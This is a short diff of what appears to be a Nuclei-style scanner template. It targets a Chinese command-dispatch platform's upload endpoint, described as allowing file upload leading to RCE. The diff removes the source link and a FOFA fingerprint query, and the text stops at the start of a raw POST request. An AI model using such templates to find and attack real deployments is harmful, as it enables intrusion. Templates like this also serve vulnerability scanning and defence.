@@ -3,12 +3,8 @@ info:
   name: 可视化融合指挥调度平台 upload 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/epznok1a5qvagfqp'
+  description: ''
   tags: rce,file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: epznok1a5qvagfqp
-    fofa: body="base/searchInfoWindow_min.css"
 http:
 - raw:
   - 'POST /dm/dispatch/user/upload HTTP/1.1
